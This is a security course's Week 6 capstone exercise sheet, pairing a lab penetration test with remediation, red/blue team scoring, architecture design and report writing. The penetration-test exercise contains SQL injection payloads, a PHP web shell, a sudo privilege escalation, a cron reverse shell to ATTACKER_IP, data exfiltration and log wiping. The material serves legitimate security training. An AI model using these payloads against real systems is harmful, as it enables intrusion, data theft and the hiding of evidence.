# Week 6 Comprehensive Exercises

## Overview
Week 6 synthesizes all previous knowledge from **Chapters 1-6** into comprehensive offensive and defensive exercises. This is the **capstone week** where students demonstrate mastery bridging red team and blue team perspectives.

---

## Exercise W6-1: Advanced Penetration Testing Assessment

**Time: 180 minutes | Difficulty: Advanced**

### Scenario: Full-Scope Penetration Test

**Target:** Three-tier vulnerable application (web + database + admin panel)  
**Scope:** Complete attack chain from reconnaissance to data exfiltration  
**Objective:** Identify all vulnerabilities and demonstrate exploitation

### Phase 1: Reconnaissance (30 minutes)

```bash
# Step 1: Information gathering
nmap -sV -sC -A -p- target-application.local | tee recon.txt

# Step 2: Technology identification
curl -I http://target-application.local:8080
curl http://target-application.local:8080/robots.txt
curl http://target-application.local:8080/sitemap.xml

# Step 3: Screenshot capture
screenfetch > system_info.txt  # or screenshot of website

# Step 4: SSL/TLS analysis
openssl s_client -connect target-application.local:443 -showcerts

# Windows/PowerShell:
(Invoke-WebRequest -Uri "http://target-application.local").Headers
Invoke-WebRequest -Uri "http://target-application.local/robots.txt"
```

### Phase 2: Enumeration (45 minutes)

```bash
# Step 1: Subdomain enumeration
dnsrecon -d target-application.local --type axfr
dig @localhost target-application.local ANY

# Step 2: Directory enumeration
feroxbuster -u http://target-application.local --status-codes 200,301,302,401

# Step 3: Parameter discovery
# Common: ?id=, ?user=, ?search=, ?admin=, ?page=

# Step 4: Default credential testing
# Common: admin/admin, admin/password, root/root12

# Step 5: Available services
netstat -tulpn | grep LISTEN
curl -v http://target/service-enumeration-endpoint

# Windows: Get available services and ports
netstat -ano
Get-Process -name "*" | Select-Object ProcessName, Id, Memory
```

### Phase 3: Vulnerability Assessment (45 minutes)

```bash
# Step 1: Automated scanning
nikto -h http://target-application.local
zap-cli --log ERROR scan target-application.local

# Step 2: Manual testing for OWASP Top 10:

# A1: SQL Injection
curl "http://target/product?id=1' OR '1'='1--"
sqlmap -u "http://target/product?id=1" -p id --batch

# A2: Authentication Bypass
curl -X POST -d "username=admin' --&password=anything" \
  http://target/login

# A3: XSS
curl "http://target/comment?text=<script>alert('XSS')</script>"

# A4: Insecure Deserialization
# Look for: Serialized objects in cookies, POST data

# A5: Broken Access Control
curl http://target/admin  # Try unauthenticated
curl -H "X-Original-URL: /admin" http://target/  # Header bypass

# A7: Cross-Site Request Forgery
# Check if CSRF tokens present and validated

# Step 3: Database reconnaissance
sqlmap -u "http://target/product?id=1" -p id --databases --batch
sqlmap -u "http://target/product?id=1" -p id -D database \
  --tables --batch
```

### Phase 4: Exploitation (45 minutes)

**SQL Injection Exploitation:**
```bash
# Step 1: Verify vulnerability
sqlmap -u "http://target/product?id=1" -p id --test-filter=STACKED

# Step 2: Extract database
sqlmap -u "http://target/product?id=1" -p id -D ecommerce \
  --dump-all --batch

# Step 3: Expected output:
# Admin credentials: admin / SuperSecret123!
# Database users: 50,000 customer records

# Step 4: Use credentials for authentication bypass
curl -X POST -d "username=admin&password=SuperSecret123!" \
  http://target/login -c cookies.txt

# Step 5: Access admin panel
curl -b cookies.txt http://target/admin/dashboard
```

**File Upload Vulnerability:**
```bash
# Step 1: Create malicious PHP shell
cat > shell.php << 'EOF'
<?php
  system($_GET['cmd']);
?>
EOF

# Step 2: Upload to application
curl -F "file=@shell.php" http://target/upload

# Step 3: Execute commands
curl "http://target/uploads/shell.php?cmd=id"
curl "http://target/uploads/shell.php?cmd=cat /etc/passwd"
```

**Privilege Escalation:**
```bash
# Step 1: Check sudo privileges
sudo -l
# Output: www-data may run (/bin/systemctl) NOPASSWD

# Step 2: Exploit misconfiguration
sudo /bin/systemctl status ssh
sudo /bin/systemctl edit ssh  # Opens editor as root
# In editor, execute: !bash

# Step 3: Confirm root access
whoami  # Should show: root
id      # Should show: uid=0(root)
```

### Phase 5: Post-Exploitation (30 minutes)

```bash
# Step 1: Establish persistence
cat > /tmp/backdoor.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
EOF

chmod +x /tmp/backdoor.sh

# Add to crontab
(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/backdoor.sh") | crontab -

# Step 2: Data exfiltration
mysql -u app_user -p'password' -e "SELECT * FROM users" > users.sql
tar -czf exfil_data.tar.gz users.sql /var/www/html/

# Step 3: Cover tracks
history -c
echo "" > /var/log/auth.log
grep -v "attacker_ip" /var/log/apache2/access.log > /var/log/apache2/access.log.new
mv /var/log/apache2/access.log.new /var/log/apache2/access.log
```

### Deliverables

- [ ] **Reconnaissance Report**
  - Identified technologies
  - Discovered services/ports
  - Network topology
  
- [ ] **Vulnerability Assessment**
  - All identified vulnerabilities
  - CVSS scoring
  - Severity rankings
  
- [ ] **Exploitation Evidence**
  - Screenshots of successful exploitation
  - Commands executed
  - Output demonstrating access
  
- [ ] **Professional Pen Test Report** (20-30 pages)
  - Executive summary (2 pages)
  - Methodology (5 pages)
  - Detailed findings (10 pages)
    - Vulnerability descriptions
    - Impact analysis
    - Proof of exploitation
  - Remediation recommendations (5 pages)
  - Evidence appendix (10+ pages)

**Success Criteria**
- ✓ Identify 5+ vulnerabilities
- ✓ Exploit 3+ critical issues
- ✓ Establish persistence
- ✓ Exfiltrate data
- ✓ Professional report
- ✓ All evidence documented

---

## Exercise W6-2: Defensive Counter-Measures & Hardening

**Time: 150 minutes | Difficulty: Advanced**

### Scenario: Remediate Vulnerabilities Discovered in W6-1

### Phase 1: Vulnerability Remediation (60 minutes)

**SQL Injection Fixes:**
```bash
# VULNERABLE CODE (PHP):
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];
$result = mysqli_query($conn, $query);

# REMEDIATED CODE (parameterized query):
$query = "SELECT * FROM users WHERE id = ?";
$stmt = mysqli_prepare($conn, $query);
mysqli_stmt_bind_param($stmt, "i", $_GET['id']);
mysqli_stmt_execute($stmt);
$result = mysqli_stmt_get_result($stmt);

# Deploy change
git commit -m "security: Fix SQL injection in product.php"
git push origin main
# Redeploy application
```

**File Upload Vulnerability Fix:**
```bash
# Whitelist extensions
$allowed = ['jpg', 'jpeg', 'png', 'gif'];
$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
if (!in_array($ext, $allowed)) {
    die("File type not allowed");
}

# Store outside web root
move_uploaded_file($file, "/var/uploads/private/" . uniqid() . ".$ext");

# Disable script execution in upload directory
# .htaccess:
<FilesMatch "\.php$">
    Deny from all
</FilesMatch>

# nginx config:
location /uploads {
    location ~ \.php$ { deny all; }
}
```

**Authentication Bypass Fix:**
```bash
# Implement CSRF tokens
// In form:
<input type="hidden" name="csrf_token" value="<?php echo generateCSRFToken(); ?>">

// On submission:
if (!validateCSRFToken($_POST['csrf_token'])) {
    die("CSRF token invalid");
}

// Implement proper authentication
session_start();
if (!isset($_SESSION['user_id'])) {
    header("Location: /login");
    exit;
}

// Add rate limiting
$failed_logins = 0;
$last_login_time = 0;
if (time() - $last_login_time < 60 && $failed_logins > 3) {
    die("Too many login attempts. Try again later.");
}
```

### Phase 2: Controls Implementation (45 minutes)

**WAF Configuration:**
```bash
# ModSecurity rules deployment
sudo apt install libapache2-mod-security2
sudo a2enmod security2

# Copy OWASP CRS
git clone https://github.com/coreruleset/coreruleset.git
sudo cp coreruleset/rules/* /usr/share/modsecurity-crs/

# Enable detection mode first, then block
SecRuleEngine DetectionOnly  # First: monitor
SecRuleEngine On              # After testing: block

# Test WAF is working
curl "http://localhost/product?id=1' OR '1'='1"
# Expected: 403 Forbidden
```

**Input Validation:**
```bash
# Server-side validation (never trust client)
function validateProductID($id) {
    if (!is_numeric($id) || $id < 1 || $id > 999999) {
        throw new InvalidArgumentException("Invalid product ID");
    }
    return (int) $id;
}

// Usage:
$id = validateProductID($_GET['id']);
$query = "SELECT * FROM products WHERE id = ?";
```

**Security Headers:**
```bash
# Apache .htaccess
Header set X-Content-Type-Options "nosniff"
Header set X-Frame-Options "DENY"
Header set X-XSS-Protection "1; mode=block"
Header set Strict-Transport-Security "max-age=31536000; includeSubDomains"
Header set Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'"

# Nginx
add_header X-Content-Type-Options "nosniff";
add_header X-Frame-Options "DENY";
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains";
```

### Phase 3: Verification & Testing (45 minutes)

```bash
# Test each fix
# 1. SQL injection block:
curl "http://localhost/product?id=1' OR '1'='1"
# Expected: Empty result or error

# 2. File upload restriction:
# Create test PHP file and upload
# Expected: Upload blocked or script doesn't execute

# 3. Authentication enforcement:
curl http://localhost/admin
# Expected: Redirected to /login

# 4. CSRF protection:
# Attempt POST without CSRF token
# Expected: Request rejected

# 5. WAF alerts
tail -f /var/log/apache2/error.log | grep ModSecurity
# Should see: "ModSecurity: Access denied"

# 6. Rate limiting
for i in {1..10}; do curl -X POST -d "password=wrong" http://localhost/login & done
# After 3-4 failures, should be rate-limited
```

### Deliverables
- [ ] Remediated source code with detailed comments
- [ ] Configuration files for all security controls
- [ ] WAF rules deployed
- [ ] Verification test cases with results
- [ ] Hardening report (3000+ words)

**Success Criteria**
- ✓ All identified vulns patched
- ✓ WAF actively blocking attacks
- ✓ Input validation enforced
- ✓ Security headers configured
- ✓ Verification tests pass
- ✓ No regressions introduced

---

## Exercise W6-3: Red Team vs Blue Team Competition

**Time: 240 minutes | Difficulty: Expert**

### Scenario: Timed CTF Exercise

**Setup:**
- Blue team deploys hardened system
- Red team performs attack
- Time limit: 3 hours
- Points for: Exploitation, detection, response

### RED TEAM OBJECTIVES (100 minutes)

1. **Reconnaissance** (20 min)
   - [ ] Identify all services
   - [ ] Find tech stack
   - [ ] Discover parameters

2. **Vulnerability Discovery** (30 min)
   - [ ] Identify 3+ vulnerabilities
   - [ ] Assess exploitability
   - [ ] Plan attack chain

3. **Exploitation** (40 min)
   - [ ] Gain initial access
   - [ ] Escalate privileges
   - [ ] Establish persistence
   - [ ] Extract flag

4. **Documentation** (10 min)
   - [ ] Screenshot evidence
   - [ ] Command history
   - [ ] Findings summary

### BLUE TEAM OBJECTIVES (100 minutes)

1. **Detection** (30 min)
   - [ ] Identify reconnaissance attempts
   - [ ] Detect exploitation attempts
   - [ ] Alert on suspicious activity

2. **Response** (45 min)
   - [ ] Contain attacker
   - [ ] Block malicious traffic
   - [ ] Revoke compromised credentials
   - [ ] Patch vulnerabilities

3. **Verification** (15 min)
   - [ ] Confirm attack stopped
   - [ ] Verify system restored
   - [ ] Test that defenses work

4. **Documentation** (10 min)
   - [ ] Alert timeline
   - [ ] Actions taken
   - [ ] Lessons learned

### Scoring

**Red Team:**
- Service identification: 10 pts
- Vulnerability discovery: 20 pts (4pts each)
- Initial compromise: 20 pts
- Privilege escalation: 20 pts
- Data exfiltration: 20 pts
- Flag capture: 10 pts
- **Total: 100 pts**

**Blue Team:**
- Detection accuracy: 15 pts
- Threat containment: 20 pts
- Remediation completeness: 25 pts
- Response speed: 20 pts
- Incident documentation: 20 pts
- **Total: 100 pts**

### Execution Flow

```
T+0:00   Red and Blue teams briefed
T+0:05   Blue team starts system deployment
T+0:20   Red team begins reconnaissance
T+0:35   Blue team deployment complete; monitoring active
T+0:45   Red team begins exploitation attempts
T+1:00   First exploitation alert (hopefully)
T+1:30   Blue team containment initiated
T+2:00   Compromise status update
T+2:30   Red team completes exploitation or gives up
T+2:45   Blue team finishes response
T+3:00   Exercise complete; debriefing begins
```

### Deliverables
- [ ] Red team attack report
- [ ] Blue team incident response report
- [ ] Side-by-side comparison
- [ ] Lessons learned
- [ ] Score sheets
- [ ] Video/recording of exercise (optional)

---

## Exercise W6-4: Security Architecture Assessment

**Time: 120 minutes | Difficulty: Advanced**

### Objective: Design Secure Enterprise Architecture

Design comprehensive security architecture for hypothetical organization:

**Organization Profile:**
- E-commerce platform with 500 employees
- 2 million daily users
- Processes payment data (PCI-DSS compliance required)
- Multi-datacenter setup (primary + backup)

### Architecture Design Components

**1. Network Architecture**
```
Internet
  ↓
[DDoS Protection]
  ↓
[WAF Layer]
  ↓
[Load Balancer]
  ↓
[Web Tier] ← [IDS/IPS] → [Logging]
  ↓
[App Tier] ← [IDS/IPS] → [Logging]
  ↓
[Database Tier] ← [Database Firewall] → [Logging]
  ↓
[Backup Infrastructure]
```

**2. Security Controls Matrix**

| Layer | Control Category | Specific Controls | Responsibility |
|-------|------------------|-------------------|-----------------||
| Perimeter | Network | Firewall, WAF, DDoS protection | Security team |
| Perimeter | Authentication | API keys, OAuth 2.0, JWT | Security engineers |
| Application | Input Validation | Parameterized queries, encoding | Dev team |
| Database | Access Control | Role-based access, row-level security | DBA + security |
| Monitoring | Logging | Centralized logging, audit trail | SOC |
| Incident Response | Procedures | IR plan, playbooks, contact list | All teams |

**3. Security Requirements**

```yaml
Authentication:
  - MFA for admin access
  - SSO for internal users
  - API authentication for services
  
Authorization:
  - Role-based access control (RBAC)
  - Least privilege principle
  - Separation of duties
  
Encryption:
  - TLS 1.2+ for transit
  - AES-256 for data at rest
  - Key rotation: 90 days
  
Compliance:
  - PCI-DSS Level 1
  - GDPR (if EU users)
  - SOC 2 Type II
  
Monitoring:
  - Real-time alerting
  - Incident response < 1 hour
  - security assessments quarterly
```

### Design Deliverables
- [ ] Network architecture diagram (detailed)
- [ ] Security control matrix
- [ ] Data flow diagram with security points
- [ ] Disaster recovery plan
- [ ] Security policies document (15+ pages)
- [ ] Technology stack justification
- [ ] Cost analysis
- [ ] Implementation roadmap

---

## Exercise W6-5: Professional Security Report Writing

**Time: 120 minutes | Difficulty: Intermediate-Advanced**

### Objective: Create Professional Penetration Test Report

Using findings from W6-1, create comprehensive professional report suitable for executive review.

### Report Structure

**1. Executive Summary** (2 pages)
```
- Engagement Overview: What was tested, timeframe
- Key Findings: 2-3 critical issues
- Risk Ranking: Critical, High, Medium, Low counts
- Remediation Timeline: Quick wins vs long-term
- Overall Risk Assessment
```

**2. Technical Details** (15 pages)
For each vulnerability:
- Vulnerability Title & CVSS Score
- Description (technical explanation)
- Proof of Exploitation (screenshot, output)
- Business Impact
- Remediation Steps (specific code/config changes)
- References (CWE, OWASP)

**3. Remediation Roadmap** (5 pages)
- Priority 1: Critical (0-30 days)
- Priority 2: High (30-90 days)
- Priority 3: Medium (90-180 days)
- Priority 4: Low (as resources allow)

**4. Appendices**
- Methodology explanation
- Tools used
- Detailed logs
- Screenshots/evidence
- Testing windows
- Credentials (encrypted)

### Template Example

```markdown
## Vulnerability #1: SQL Injection in Product Search

**CVSS Score:** 9.8 (Critical)  
**Component:** /product/search endpoint  
**Impact:** Unauthorized database access, data breach

### Description
The product search interface fails to properly sanitize user input
before building SQL queries. An attacker can inject arbitrary SQL
commands to access unauthorized data.

### Proof of Exploitation
```
GET /product/search?q=1' OR '1'='1-- HTTP/1.1
Host: target.com

Response: Returns ALL products in database (50,000 records)
```

### Business Impact
- Potential exposure of 2 million customer records
- Privacy violation (GDPR fine: up to 20M EUR)
- Reputation damage
- Possible payment data exposure (PCI-DSS violation)

### Remediation
1. Implement parameterized queries
2. Add input validation whitelist
3. Implement WAF rules
4. Audit database access logs
5. Notify customers if data accessed

### Timeline Impact
- Fix time: 2-4 hours (code change)
- Testing: 1 day
- Deployment: Same day (production hotfix)
- Total: 1 day to resolve
```

### Deliverables
- [ ] Professional penetration test report (25-35 pages)
- [ ] Executive summary document (standalone, 2-3 pages)
- [ ] Risk ranking matrix
- [ ] Detailed remediation roadmap with timelines
- [ ] Evidence appendix with screenshots

**Success Criteria**
- ✓ Clear executive summary non-technical users understand
- ✓ Detailed technical sections for IT/security team
- ✓ Specific, actionable remediation steps
- ✓ Professional formatting and appearance
- ✓ Proper CVSS and CWE references
- ✓ Complete evidence documentation

---

## Exercise W6-6: Capstone Project - Comprehensive Security Assessment

**Time: 360+ minutes | Difficulty: Expert**

### Scenario: Complete Enterprise Security Audit

**Deliverables Required:**

### 1. **Full Penetration Test Report** (30 pages)
- Reconnaissance findings
- Vulnerability assessment (5+ vulns identified)
- Exploitation proof-of-concept
- Detailed remediation

### 2. **Security Architecture Review** (20 pages)
- Current architecture analysis
- Proposed improvements
- Security controls assessment
- Compliance mapping

### 3. **Incident Response Plan** (15 pages)
- Procedures for various incident types
- Escalation matrix
- Communication plan
- Recovery procedures

### 4. **Security Policies & Standards** (25 pages)
- Access control policy
- Data classification
- Acceptable use policy
- Incident response procedures
- Security training requirements

### 5. **Monitoring & Detection Plan** (15 pages)
- SIEM configuration
- IDS/IPS rules
- Alert procedures
- Metrics and KPIs

### 6. **Executive Presentation**
- 30-minute presentation for stakeholders
- Key risks and recommendations
- Risk vs cost tradeoff analysis
- Implementation roadmap

### 7. **Implementation Roadmap** (10 pages)
- Phase 1: Immediate actions (0-30 days)
- Phase 2: Short-term (30-90 days)
- Phase 3: Medium-term (90-180 days)
- Phase 4: Long-term (6-12 months)
- Budget requirements
- Resource allocation

### Project Submission Checklist
- [ ] All reports completed and reviewed
- [ ] Executive summary standalone document
- [ ] Technical appendices with evidence
- [ ] Presentation slides prepared
- [ ] Implementation timeline documented
- [ ] Budget requirements calculated
- [ ] Team assigned for each phase
- [ ] Success metrics defined

### Grading Rubric
| Category | Points | Criteria |
|----------|--------|----------|
| Penetration Testing | 25 | Thorough findings, detailed exploitation |
| Architecture Review | 15 | Security-focused design, cost-effective |
| Incident Response | 15 | Comprehensive procedures, tested |
| Policies/Standards | 15 | Complete, practical, enforceable |
| Monitoring Plan | 15 | Effective detection, actionable alerts |
| Presentation | 10 | Clear communication to executives |
| Implementation Plan | 10 | Realistic timeline, prioritized |
| **TOTAL** | **100** | |

---

## Week 6 Summary & Capstone Completion

### By End of Week 6, You Will Have:

✅ Performed comprehensive penetration test  
✅ Designed secure enterprise architecture  
✅ Created incident response procedures  
✅ Developed security policies and standards  
✅ Deployed monitoring and detection systems  
✅ Created professional security reports  
✅ Demonstrated red team and blue team capabilities  
✅ Understood risk management and compliance  

### Portfolio Materials

Your Week 6 work should form the core of your professional security portfolio:

- Professional penetration test reports (2-3 examples)
- Security architecture diagrams and documentation
- Incident response plans and procedures
- Security policy templates
- Presentation examples
- Case studies of remediation projects

### Career Readiness

After completing Week 6, you should be prepared for:
- **Security Analyst** roles (SOC, Blue Team)
- **Penetration Tester** / Ethical Hacker roles
- **Security Architect** positions (with additional exp)
- **Compliance Officer** roles
- **Incident Response** specialist positions

### Final Checklist

Before submitting final project:
- [ ] All exercises completed
- [ ] Reports reviewed for clarity and accuracy
- [ ] Professional formatting applied
- [ ] Evidence properly documented
- [ ] Recommendations are specific and actionable
- [ ] Timeline is realistic
- [ ] Budget requirements calculated
- [ ] Presentation slides prepared and reviewed
- [ ] Peer review completed
- [ ] Backup copies created

### Resources for Continued Learning

- **OSCP**: Offensive Security Certified Professional
- **CEH**: Certified Ethical Hacker
- **CISSP**: Certified Information Systems Security Professional
- **Security+ / Network+**: CompTIA foundational certs
- **Specialized Paths**: Cloud security, application security, forensics

---

## Estimated Effort Summary

**Week 6 Total Effort: 15-20 hours**

Breakdown:
- Penetration Testing: 5 hours
- Blue Team Defense: 4 hours
- Red vs Blue CTF: 4 hours
- Architecture Design: 3 hours
- Report Writing: 3 hours
- Capstone Project: 5+ hours

---

**Congratulations on completing the 6-Week Server Security & Offensive Security program!**

This curriculum provides industry-relevant experience suitable for entry-level security positions. The combination of defensive hardening, offensive exploitation, monitoring/detection, and incident response gives you a well-rounded security foundation.

Next Steps:
1. Pursue recognized certifications (Security+, CEH, OSCP)
2. Build a portfolio of security projects
3. Contribute to open-source security tools
4. Participate in CTF competitions and bug bounty programs
5. Continue hands-on practice with platforms like HackTheBox, TryHackMe

**Good luck in your security career!**
